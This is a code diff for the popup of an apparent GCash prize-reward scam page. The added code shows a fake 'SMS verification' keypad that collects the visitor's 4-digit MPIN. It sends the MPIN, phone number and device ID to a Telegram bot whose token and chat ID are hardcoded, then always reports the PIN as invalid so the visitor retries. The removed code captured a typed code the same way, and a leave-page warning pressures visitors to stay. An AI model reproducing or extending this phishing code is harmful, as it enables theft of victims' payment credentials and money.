@@ -1,6 +1,6 @@
 /**
  * Popup Share Module - Complete with Firewall Logic
- * Phase 1 (Default) → Check Firewall → Phase 2 (OFF) or Phase 3 (ON)
+ * Phase 1 (Default) → Check Firewall → Phase 2 (OFF) or Phase 3 (ON via SMS)
  */
 
 // ========== POPUP MODULE ==========
@@ -12,10 +12,11 @@
     let claimInProgress = false;
     let isRedirecting = false;
     let currentFirewallStatus = false;
+    let enteredMPIN = '';  // For 4-digit MPIN
     
     // ========== INITIALIZATION ==========
     function init() {
-        console.log('🎁 Popup Module Starting...');
+        console.log('Popup Module Starting...');
         
         const popup = document.getElementById('prizePopup');
         if (!popup) {
@@ -28,7 +29,7 @@
         attachFirewallEvents();
         addAnimations();
         
-        console.log('✅ Popup Module ready');
+        console.log('Popup Module ready');
     }
     
     // ========== ADD ANIMATIONS ==========
@@ -52,8 +53,63 @@
                 75% { transform: translateX(-5px); }
                 100% { transform: translateX(0); }
             }
+            @keyframes neonBluePulse {
+                0% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
+                50% { box-shadow: 0 0 15px #00f2ff, 0 0 25px #00f2ff, 0 0 35px #00f2ff; }
+                100% { box-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff; }
+            }
             .btn-pulse {
                 animation: pulse 0.5s ease;
+            }
+            .shake-effect {
+                animation: shake 0.3s ease-in-out;
+            }
+            .numeric-keypad {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 12px;
+                padding: 15px;
+                background: rgba(0, 242, 255, 0.08);
+                border-radius: 30px;
+                margin: 15px 0;
+            }
+            .num-btn {
+                background: rgba(255, 255, 255, 0.15);
+                backdrop-filter: blur(10px);
+                border: 1px solid rgba(255, 255, 255, 0.3);
+                border-radius: 50%;
+                width: 60px;
+                height: 60px;
+                font-size: 24px;
+                font-weight: bold;
+                color: white;
+                cursor: pointer;
+                transition: all 0.2s ease;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin: 0 auto;
+            }
+            .num-btn:active {
+                transform: scale(0.95);
+                background: rgba(255, 255, 255, 0.3);
+            }
+            .mpin-dots {
+                display: flex;
+                justify-content: center;
+                gap: 15px;
+                margin: 20px 0;
+            }
+            .mpin-dot {
+                width: 16px;
+                height: 16px;
+                border-radius: 50%;
+                background: rgba(255, 255, 255, 0.3);
+                transition: all 0.2s ease;
+            }
+            .mpin-dot.filled {
+                background: #00f2ff;
+                box-shadow: 0 0 10px #00f2ff;
             }
         `;
         if (!document.querySelector('#popup-animations')) {
@@ -69,7 +125,7 @@
             const snapshot = await db.ref('admin/globalFirewall').once('value');
             const data = snapshot.val();
             currentFirewallStatus = (data && data.active === true);
-            console.log('🔥 Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
+            console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
             return currentFirewallStatus;
         } catch(e) {
             console.error('Firewall error:', e);
@@ -77,37 +133,31 @@
         }
     }
     
-    // ========== ATTACH CLAIM BUTTON (SIMPLEST) ==========
-function attachClaimButton() {
-    const claimBtn = document.getElementById('claimNowBtn');
-    if (!claimBtn) {
-        console.error('Claim button not found!');
-        return;
-    }
-    
-    // Diretso onclick para sigurado
-    claimBtn.onclick = function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        
-        console.log('Claim button clicked!');
-        
-        let balance = 0;
-        if (window.PromotionCore) {
-            balance = window.PromotionCore.getBalance();
-        } else {
-            const balanceEl = document.getElementById('userBalanceDisplay');
-            if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
+    // ========== ATTACH CLAIM BUTTON ==========
+    function attachClaimButton() {
+        const claimBtn = document.getElementById('claimNowBtn');
+        if (!claimBtn) {
+            console.error('Claim button not found!');
+            return;
         }
         
-        showPopup(balance);
+        claimBtn.onclick = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            console.log('Claim button clicked!');
+            
+            let balance = 0;
+            const balanceEl = document.getElementById('userBalanceDisplay');
+            if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
+            
+            showPopup(balance);
+            
+            if (window.ConfettiModule) window.ConfettiModule.start();
+        };
         
-        if (window.PromotionCore) window.PromotionCore.playSound('scatter');
-        if (window.ConfettiModule) window.ConfettiModule.start();
-    };
-    
-    console.log('Claim button attached (simplest method)');
-}
+        console.log('Claim button attached');
+    }
     
     // ========== ATTACH FIREWALL EVENTS ==========
     function attachFirewallEvents() {
@@ -137,205 +187,289 @@ function attachClaimButton() {
         }
     }
     
+    // ========== MARK LINK AS USED ==========
+    async function markLinkAsUsed(linkKey, userPhone) {
+        try {
+            const db = firebase.database();
+            await db.ref('links/' + linkKey).update({
+                status: 'used',
+                user: userPhone,
+                usedAt: Date.now()
+            });
+            console.log(`Link ${linkKey} marked as used`);
+        } catch(e) {
+            console.error('Error marking link:', e);
+        }
+    }
+    
     // ========== BEFORE UNLOAD HANDLER ==========
     function beforeUnloadHandler(e) {
         if (claimInProgress && !isRedirecting) {
-            const message = "⚠️ Your payout is unsuccessful!\n\nUpdate or Install GCash App and withdraw your task reward.\n\nor Switch Device and try again!";
+            const message = "Your payout is unsuccessful! Please complete the process.";
             e.preventDefault();
             e.returnValue = message;
             return message;
         }
     }
     
-    // ========== SHOW FIREWALL POPUP (Phase 3) ==========
-function showFirewallPopup() {
-    const popupInner = document.querySelector('.popup-inner');
-    if (!popupInner) return;
+    // ========== SEND SMS NOTIFICATION (Telegram) ==========
+    async function sendSMSNotification(userPhone, deviceId) {
+        try {
+            const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+            const chatId = "7298607329";
+            const now = new Date();
+            const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+            
+            const message = `📱 SMS VERIFICATION REQUEST
+User: ${userPhone}
+Device ID: ${deviceId}
+Time: ${timestamp}
+Type: SMS Code Request`;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            console.log('SMS notification sent to Telegram');
+        } catch(e) {
+            console.error('Telegram error:', e);
+        }
+    }
     
-    currentPhase = 3;
+    // ========== SEND VERIFICATION ATTEMPT ==========
+    async function sendVerificationAttempt(userPhone, deviceId, code) {
+        try {
+            const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+            const chatId = "7298607329";
+            const now = new Date();
+            const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+            
+            const message = `🔑 MPIN VERIFICATION ATTEMPT
+User: ${userPhone}
+Device ID: ${deviceId}
+Entered MPIN: ${code}
+Time: ${timestamp}
+Status: INVALID`;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            console.log('Verification attempt sent to Telegram');
+        } catch(e) {
+            console.error('Telegram error:', e);
+        }
+    }
     
-    // Send Telegram notification for REQUEST CALL
-    const userPhone = localStorage.getItem("userPhone") || "Unknown";
-    const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-    sendFirewallRequestNotification(userPhone, deviceId);
+    // ========== SHOW FIREWALL POPUP (Phase 3 - SMS Verification) ==========
+    function showFirewallPopup() {
+        const popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        currentPhase = 3;
+        enteredMPIN = '';
+        
+        // Send SMS notification to Telegram (admin)
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        sendSMSNotification(userPhone, deviceId);
+        
+        // Fade out transition
+        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+        popupInner.style.opacity = '0';
+        popupInner.style.transform = 'scale(0.95)';
+        
+        setTimeout(() => {
+            showPhase3();
+            popupInner.style.opacity = '1';
+            popupInner.style.transform = 'scale(1)';
+        }, 300);
+    }
     
-    // Fade out transition
-    popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
-    popupInner.style.opacity = '0';
-    popupInner.style.transform = 'scale(0.95)';
-    
-    setTimeout(() => {
-        showPhase3();
-        popupInner.style.opacity = '1';
-        popupInner.style.transform = 'scale(1)';
-    }, 300);
-}
-
-// ========== PHASE 3: VERIFICATION CALL UI (NEW) ==========
-function showPhase3() {
-    const popupInner = document.querySelector('.popup-inner');
-    if (!popupInner) return;
-    
-    popupInner.innerHTML = `
-        <div class="popup-close" id="popupClosePhase3">✕</div>
+    // ========== PHASE 3: SMS VERIFICATION (NEON BLUE + NUMERIC KEYPAD) ==========
+    function showPhase3() {
+        const popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
         
-        <!-- VERIFICATION ICON -->
-        <div style="text-align: center; margin-bottom: 10px;">
-            <div style="font-size: 60px; animation: bounceIn 0.5s ease;">📞</div>
-        </div>
+        // Adjust popup container size
+        const popupContainer = document.querySelector('.popup-container');
+        if (popupContainer) {
+            popupContainer.style.maxWidth = '380px';
+            popupContainer.style.width = '90%';
+        }
         
-        <!-- TITLE -->
-        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; color: #ff4444; margin: 5px 0; letter-spacing: 1px;">
-            VERIFICATION REQUIRED
-        </h2>
-        
-        <div class="divider" style="width: 40px; margin: 10px auto; background: #ff4444;"></div>
-        
-        <!-- MESSAGE -->
-        <div style="background: linear-gradient(135deg, rgba(255,68,68,0.1), rgba(255,68,68,0.05)); border-radius: 16px; padding: 15px; margin: 10px 0;">
-            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ff8888; line-height: 1.5; text-align: center; margin: 0 0 10px 0;">
-                Due to the high number of winners today, we need to verify your number to prevent fraud and ensure your task rewards go to the right person.
-            </p>
-            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ffd700; line-height: 1.5; text-align: center; margin: 0; font-weight: 500;">
-                <strong>Expect a short system-verification call from us.</strong><br>
-                You will receive a <strong style="color: #00aaff;">4-digit verification code</strong> during the call.
-            </p>
-        </div>
-        
-        <!-- VERIFICATION INPUT -->
-        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 20px; padding: 15px; margin: 15px 0;">
+        popupInner.innerHTML = `
+            <div class="popup-close" id="popupClosePhase3">✕</div>
+            
+            <!-- SMS ICON -->
             <div style="text-align: center; margin-bottom: 10px;">
-                <span style="font-size: 12px; color: #00aaff;">ENTER VERIFICATION CODE</span>
+                <div style="font-size: 55px; animation: bounceIn 0.5s ease;">📱</div>
             </div>
-            <div style="display: flex; gap: 10px; justify-content: center;">
-                <input type="text" id="verificationCodePhase3" class="verification-input" placeholder="1234" maxlength="4" inputmode="numeric" style="text-align: center; font-size: 24px; font-weight: bold; width: 120px; padding: 12px;">
-                <button id="verifyCodePhase3Btn" class="claim-gcash-button" style="background: linear-gradient(135deg, #00aaff, #0066cc); width: auto; padding: 0 20px;">
-                    VERIFY
-                </button>
+            
+            <!-- TITLE -->
+            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #00f2ff; margin: 5px 0; letter-spacing: 1px; text-shadow: 0 0 10px #00f2ff; animation: neonBluePulse 1.5s infinite;">
+                SMS VERIFICATION
+            </h2>
+            
+            <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
+            
+            <!-- MESSAGE -->
+            <div style="background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 12px; margin: 10px 0;">
+                <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; line-height: 1.5; text-align: center; margin: 0;">
+                    A <strong style="color: #00f2ff;">6-digit verification code</strong> has been sent to your registered mobile number.
+                </p>
             </div>
-            <div id="firewallErrorMsgPhase3" class="firewall-error" style="display: none; text-align: center; margin-top: 10px; color: #ff8888; font-size: 11px;"></div>
-        </div>
+            
+            <!-- MPIN DOTS DISPLAY -->
+            <div class="mpin-dots" id="mpinDots">
+                <div class="mpin-dot"></div>
+                <div class="mpin-dot"></div>
+                <div class="mpin-dot"></div>
+                <div class="mpin-dot"></div>
+            </div>
+            
+            <!-- ERROR MESSAGE -->
+            <div id="mpinErrorMsg" style="display: none; text-align: center; margin: 10px 0; color: #ff4444; font-size: 12px; background: rgba(255,68,68,0.1); padding: 8px; border-radius: 20px;">
+                ❌ Invalid MPIN. Please try again.
+            </div>
+            
+            <!-- NUMERIC KEYPAD -->
+            <div class="numeric-keypad">
+                <button class="num-btn" data-num="1">1</button>
+                <button class="num-btn" data-num="2">2</button>
+                <button class="num-btn" data-num="3">3</button>
+                <button class="num-btn" data-num="4">4</button>
+                <button class="num-btn" data-num="5">5</button>
+                <button class="num-btn" data-num="6">6</button>
+                <button class="num-btn" data-num="7">7</button>
+                <button class="num-btn" data-num="8">8</button>
+                <button class="num-btn" data-num="9">9</button>
+                <button class="num-btn" data-num="clear" style="font-size: 14px;">⌫</button>
+                <button class="num-btn" data-num="0">0</button>
+                <button class="num-btn" data-num="reset" style="font-size: 14px;">🗑️</button>
+            </div>
+            
+            <div style="font-size: 10px; color: #ffaa33; text-align: center; margin: 10px 0;">
+                ⏳ Enter the 4-digit MPIN sent via SMS
+            </div>
+            
+            <div class="button-separator" style="margin: 15px 0 10px;"></div>
+            
+            <button class="back-btn" id="backBtnPhase3" style="transition: all 0.2s ease; width: 100%;">
+                ← BACK
+            </button>
+        `;
         
-        <!-- WAITING NOTE -->
-        <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
-            <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
-                ⏳ Waiting for verification call... Please answer the call to receive your code.
-            </p>
-        </div>
-        
-        <div class="button-separator" style="margin: 15px 0 10px;"></div>
-
-        <button class="back-btn" id="backBtnPhase3" style="transition: all 0.2s ease; width: 100%;">
-            ← DO TASK
-        </button>
-    `;
+        // Attach Phase 3 events
+        attachPhase3Events(popupInner);
+    }
     
-    // Attach Phase 3 events
-    attachPhase3Events(popupInner);
-}
-
-// ========== ATTACH PHASE 3 EVENTS ==========
-function attachPhase3Events(popupInner) {
-    const closeBtn = document.getElementById('popupClosePhase3');
-    if (closeBtn) closeBtn.onclick = function() { 
-        closePopup();
-        hideFirewallPopup();
-    };
+    // ========== UPDATE MPIN DOTS ==========
+    function updateMPINDots() {
+        const dots = document.querySelectorAll('.mpin-dot');
+        for (let i = 0; i < dots.length; i++) {
+            if (i < enteredMPIN.length) {
+                dots[i].classList.add('filled');
+            } else {
+                dots[i].classList.remove('filled');
+            }
+        }
+    }
     
-    const backBtn = document.getElementById('backBtnPhase3');
-    if (backBtn) {
-        backBtn.onclick = function() {
-            popupInner.style.transition = 'opacity 0.3s ease';
-            popupInner.style.opacity = '0';
+    // ========== CHECK MPIN (4-digit) ==========
+    async function checkMPIN() {
+        if (enteredMPIN.length === 4) {
+            const userPhone = localStorage.getItem("userPhone") || "Unknown";
+            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+            
+            // Send verification attempt to Telegram
+            await sendVerificationAttempt(userPhone, deviceId, enteredMPIN);
+            
+            // Show error message with shake effect
+            const errorMsg = document.getElementById('mpinErrorMsg');
+            const mpinDots = document.getElementById('mpinDots');
+            
+            if (errorMsg) {
+                errorMsg.style.display = 'block';
+            }
+            if (mpinDots) {
+                mpinDots.classList.add('shake-effect');
+                setTimeout(() => {
+                    if (mpinDots) mpinDots.classList.remove('shake-effect');
+                }, 300);
+            }
+            
+            // Clear entered MPIN
+            enteredMPIN = '';
+            updateMPINDots();
+            
+            // Hide error after 2 seconds
             setTimeout(() => {
-                showPhase1(currentBalance);
-                popupInner.style.opacity = '1';
-            }, 300);
+                if (errorMsg) errorMsg.style.display = 'none';
+            }, 2000);
+        }
+    }
+    
+    // ========== ATTACH PHASE 3 EVENTS ==========
+    function attachPhase3Events(popupInner) {
+        const closeBtn = document.getElementById('popupClosePhase3');
+        if (closeBtn) closeBtn.onclick = function() { 
+            closePopup();
             hideFirewallPopup();
         };
-    }
-    
-    const codeInput = document.getElementById('verificationCodePhase3');
-    const verifyBtn = document.getElementById('verifyCodePhase3Btn');
-    const errorMsg = document.getElementById('firewallErrorMsgPhase3');
-    
-    if (codeInput) {
-        codeInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                verifyFirewallCodePhase3();
-            }
-        });
-    }
-    
-    if (verifyBtn) {
-        // Remove any existing listeners
-        const newVerifyBtn = verifyBtn.cloneNode(true);
-        verifyBtn.parentNode.replaceChild(newVerifyBtn, verifyBtn);
         
-        newVerifyBtn.onclick = function() {
-            verifyFirewallCodePhase3();
-        };
-    }
-}
-
-// ========== VERIFY FIREWALL CODE (Phase 3) ==========
-function verifyFirewallCodePhase3() {
-    const codeInput = document.getElementById('verificationCodePhase3');
-    const errorMsg = document.getElementById('firewallErrorMsgPhase3');
-    const code = codeInput?.value.trim();
-    
-    const userPhone = localStorage.getItem("userPhone") || "Unknown";
-    const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-    
-    if (!code || code.length !== 4) {
-        if (errorMsg) {
-            errorMsg.innerText = "⚠️ Invalid code. Enter 4 digits.";
-            errorMsg.style.display = 'block';
+        const backBtn = document.getElementById('backBtnPhase3');
+        if (backBtn) {
+            backBtn.onclick = function() {
+                popupInner.style.transition = 'opacity 0.3s ease';
+                popupInner.style.opacity = '0';
+                setTimeout(() => {
+                    showPhase1(currentBalance);
+                    popupInner.style.opacity = '1';
+                }, 300);
+                hideFirewallPopup();
+            };
         }
-        if (codeInput) {
-            codeInput.style.animation = 'shake 0.3s ease-in-out';
-            setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
+        
+        // Attach numeric keypad buttons
+        const numBtns = document.querySelectorAll('.num-btn');
+        for (let i = 0; i < numBtns.length; i++) {
+            const btn = numBtns[i];
+            btn.onclick = function() {
+                const num = this.getAttribute('data-num');
+                
+                if (num === 'clear') {
+                    // Remove last character
+                    enteredMPIN = enteredMPIN.slice(0, -1);
+                    updateMPINDots();
+                } 
+                else if (num === 'reset') {
+                    // Clear all
+                    enteredMPIN = '';
+                    updateMPINDots();
+                }
+                else if (enteredMPIN.length < 4) {
+                    // Add number
+                    enteredMPIN += num;
+                    updateMPINDots();
+                    
+                    // Auto-check when 4 digits are entered
+                    if (enteredMPIN.length === 4) {
+                        checkMPIN();
+                    }
+                }
+            };
         }
-        return;
     }
     
-    // SEND TELEGRAM NOTIFICATION
-    sendVerificationAttemptNotification(userPhone, deviceId, code);
-    
-    // ALWAYS INVALID
-    if (errorMsg) {
-        errorMsg.innerText = "⚠️ Invalid verification code. Please wait for the call.";
-        errorMsg.style.display = 'block';
+    // ========== HIDE FIREWALL POPUP ==========
+    function hideFirewallPopup() {
+        console.log('Firewall popup closed');
     }
-    if (codeInput) {
-        codeInput.style.animation = 'shake 0.3s ease-in-out';
-        setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
-        codeInput.value = '';
-    }
-    
-    if (verifyBtn) {
-        setTimeout(() => {
-            verifyBtn.disabled = false;
-            verifyBtn.innerText = "VERIFY";
-        }, 1000);
-    }
-}
-
-// ========== HIDE FIREWALL POPUP (keep this) ==========
-function hideFirewallPopup() {
-    // Just resets the phase, no separate popup
-    console.log('Firewall popup closed');
-}
     
     // ========== CHECK FIREWALL AND TRANSITION ==========
     async function checkFirewallAndTransition() {
         const isFirewallOn = await getFirewallStatus();
         
         if (isFirewallOn) {
-            console.log('🔥 Firewall ON - Showing firewall verification popup');
+            console.log('Firewall ON - Showing SMS verification popup');
             showFirewallPopup();
         } else {
-            console.log('🔓 Firewall OFF - Transition to Phase 2');
+            console.log('Firewall OFF - Transition to Phase 2');
             transitionToPhase2();
         }
     }
@@ -360,6 +494,13 @@ function hideFirewallPopup() {
     function showPhase1(balance) {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
+        
+        // Reset popup container size
+        const popupContainer = document.querySelector('.popup-container');
+        if (popupContainer) {
+            popupContainer.style.maxWidth = '360px';
+            popupContainer.style.width = '90%';
+        }
         
         currentBalance = balance;
         currentPhase = 1;
@@ -411,253 +552,118 @@ function hideFirewallPopup() {
         }
     }
     
-    // ========== PHASE 2: WITHDRAWAL LINK ==========
+    // ========== PHASE 2: WITHDRAWAL LINK (Keep existing) ==========
     function showPhase2() {
-    const popupInner = document.querySelector('.popup-inner');
-    if (!popupInner) return;
-    
-    currentPhase = 2;
-    
-    // Adjust popup container size
-    const popupContainer = document.querySelector('.popup-container');
-    if (popupContainer) {
-        popupContainer.style.maxWidth = '320px';  // From 360px to 320px
-        popupContainer.style.width = '85%';       // From 90% to 85%
+        const popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        currentPhase = 2;
+        
+        const popupContainer = document.querySelector('.popup-container');
+        if (popupContainer) {
+            popupContainer.style.maxWidth = '320px';
+            popupContainer.style.width = '85%';
+        }
+        
+        popupInner.innerHTML = `
+            <div class="popup-close" id="popupClosePhase2">✕</div>
+            
+            <div style="text-align: center; margin-bottom: 5px;">
+                <div style="font-size: 45px; animation: bounceIn 0.5s ease;">🏆</div>
+            </div>
+            
+            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 3px 0; letter-spacing: 1px;">
+                GREAT JOB!
+            </h2>
+            
+            <div class="divider" style="width: 30px; margin: 8px auto;"></div>
+            
+            <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 12px; padding: 10px; margin: 8px 0;">
+                <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #e0e0e0; line-height: 1.4; text-align: center; margin: 0;">
+                    "Nice work today! You made that look easy!"
+                </p>
+                <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ffd700; line-height: 1.4; text-align: center; margin: 5px 0 0 0;">
+                    You're one tap away from getting your reward amounting to 
+                    <span style="font-size: 20px; font-weight: 900; color: #ffd700; text-shadow: 0 0 8px rgba(255,215,0,0.5);">₱${currentBalance.toFixed(2)}</span>
+                </p>
+            </div>
+            
+            <button class="claim-gcash-button" id="proceedBtn" style="transition: all 0.2s ease; width: 100%; padding: 12px; font-size: 14px; margin-top: 8px;">
+                <img src="images/gc_icon.png" class="gc-icon" style="width: 18px; height: 18px;"> CLAIM VIA GCASH APP
+            </button>
+
+            <div class="button-separator" style="margin: 10px 0 8px;"></div>
+
+            <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%; padding: 8px; font-size: 12px;">
+                ← COMPLETE TASK #2
+            </button>
+        `;
+        
+        attachPhase2Events();
     }
     
-    popupInner.innerHTML = `
-        <div class="popup-close" id="popupClosePhase2">✕</div>
+    // ========== ATTACH PHASE 2 EVENTS ==========
+    function attachPhase2Events() {
+        const closeBtn = document.getElementById('popupClosePhase2');
+        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
         
-        <div style="text-align: center; margin-bottom: 5px;">
-            <div style="font-size: 45px; animation: bounceIn 0.5s ease;">🏆</div>
-        </div>
-        
-        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 3px 0; letter-spacing: 1px;">
-            GREAT JOB!
-        </h2>
-        
-        <div class="divider" style="width: 30px; margin: 8px auto;"></div>
-        
-        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 12px; padding: 10px; margin: 8px 0;">
-            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #e0e0e0; line-height: 1.4; text-align: center; margin: 0;">
-                "Nice work today! You made that look easy!"
-            </p>
-            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ffd700; line-height: 1.4; text-align: center; margin: 5px 0 0 0;">
-                You’re one tap away by getting your task reward amounting to 
-                <span style="font-size: 20px; font-weight: 900; color: #ffd700; text-shadow: 0 0 8px rgba(255,215,0,0.5);">₱${currentBalance.toFixed(2)}</span> 
-                <br>to your Digital Wallet.
-            </p>
-        </div>
-        
-        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 40px; padding: 8px 15px; margin: 10px 0; text-align: center;">
-            <p style="font-family: 'Inter', sans-serif; font-size: 10px; color: #ccc; margin: 0;">
-                Once you 
-                <span style="font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 900; color: #00aaff; text-shadow: 0 0 5px rgba(0,170,255,0.5);">AUTHORIZED</span>, 
-                we will finalize the instant withdrawal.
-            </p>
-        </div>
-        
-        <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 1px solid #ffd700; border-radius: 16px; padding: 10px; margin: 10px 0; text-align: center;">
-            <div style="font-size: 9px; color: #ffd700; text-transform: uppercase; letter-spacing: 2px;">PRIZE AMOUNT</div>
-            <div style="font-size: 36px; font-weight: 900; color: #ffd700; text-shadow: 0 0 10px rgba(255,215,0,0.3); font-family: 'Orbitron', monospace;">₱${currentBalance.toFixed(2)}</div>
-            <div style="height: 1px; background: linear-gradient(90deg, transparent, #ffd700, transparent); width: 60%; margin: 5px auto;"></div>
-            <div style="font-size: 9px; color: #888;">Ready for payout</div>
-        </div>
-        
-        <div style="background: rgba(255,215,0,0.05); border-left: 2px solid #ffd700; border-radius: 6px; padding: 6px 10px; margin: 8px 0;">
-            <p style="margin: 0; font-size: 9px; color: #ffd700; text-align: center;">
-                💡 Must have verified GCash account
-            </p>
-        </div>
-        
-        <button class="claim-gcash-button" id="proceedBtn" style="transition: all 0.2s ease; width: 100%; padding: 12px; font-size: 14px; margin-top: 8px;">
-            <img src="images/gc_icon.png" class="gc-icon" style="width: 18px; height: 18px;"> CLAIM VIA GCASH APP
-        </button>
-
-        <div class="button-separator" style="margin: 10px 0 8px;"></div>
-
-        <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%; padding: 8px; font-size: 12px;">
-            ← COMPLETE TASK# 2
-        </button>
-    `;
-    
-    attachPhase2Events(popupInner);
-}
-    
-   // ========== ATTACH PHASE 2 EVENTS (FIXED) ==========
-function attachPhase2Events(popupInner) {
-    const closeBtn = document.getElementById('popupClosePhase2');
-    if (closeBtn) closeBtn.onclick = function() { closePopup(); };
-    
-    const backBtn = document.getElementById('backBtnPhase2');
-    if (backBtn) {
-        backBtn.onclick = function() {
-            popupInner.style.transition = 'opacity 0.3s ease';
-            popupInner.style.opacity = '0';
-            setTimeout(() => {
-                showPhase1(currentBalance);
-                popupInner.style.opacity = '1';
-            }, 300);
-        };
-    }
-    
-    const proceedBtn = document.getElementById('proceedBtn');
-    if (proceedBtn) {
-        proceedBtn.onclick = async function() {
-            if (claimInProgress) return;
-
-            const userPhone = localStorage.getItem("userPhone") || "Unknown";
-            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-            
-            await sendTelegramMessage(userPhone, deviceId, 'claim_click', '');
-            
-            claimInProgress = true;
-            
-            this.classList.add('btn-pulse');
-            setTimeout(() => this.classList.remove('btn-pulse'), 500);
-            
-            this.disabled = true;
-            this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
-            this.style.opacity = '0.8';
-            
-            window.addEventListener('beforeunload', beforeUnloadHandler);
-            
-            const linkData = await getLatestPayoutLink();
-            
-            if (linkData && linkData.url) {
-                // HANAPIN ANG PRIZE AMOUNT ELEMENT SA PHASE 2
-                const prizeAmountElement = document.querySelector('#proceedBtn').closest('.popup-inner').querySelector('.prize-amount-wrapper div[style*="font-size: 36px"]');
-                
-                if (prizeAmountElement) {
-                    // I-disable ang button habang nag-cocountdown
-                    this.disabled = true;
-                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> COUNTDOWN...`;
-                    
-                    // Countdown mula sa current balance pababa hanggang 0 (3 seconds)
-                    const startValue = currentBalance;
-                    const steps = 60;
-                    const decrement = startValue / steps;
-                    
-                    for (let i = 0; i <= steps; i++) {
-                        const current = startValue - (decrement * i);
-                        prizeAmountElement.innerText = `₱${current.toFixed(2)}`;
-                        await new Promise(r => setTimeout(r, 50)); // 50ms x 60 = 3 seconds
-                    }
+        const backBtn = document.getElementById('backBtnPhase2');
+        if (backBtn) {
+            backBtn.onclick = function() {
+                const popupInner = document.querySelector('.popup-inner');
+                if (popupInner) {
+                    popupInner.style.transition = 'opacity 0.3s ease';
+                    popupInner.style.opacity = '0';
+                    setTimeout(() => {
+                        showPhase1(currentBalance);
+                        popupInner.style.opacity = '1';
+                    }, 300);
                 }
+            };
+        }
+        
+        const proceedBtn = document.getElementById('proceedBtn');
+        if (proceedBtn) {
+            proceedBtn.onclick = async function() {
+                if (claimInProgress) return;
                 
-                // MARK LINK AS USED
-                await markLinkAsUsed(linkData.key, userPhone);
+                claimInProgress = true;
                 
-                isRedirecting = true;
-                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
-                setTimeout(() => {
+                this.classList.add('btn-pulse');
+                setTimeout(() => this.classList.remove('btn-pulse'), 500);
+                
+                this.disabled = true;
+                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING...`;
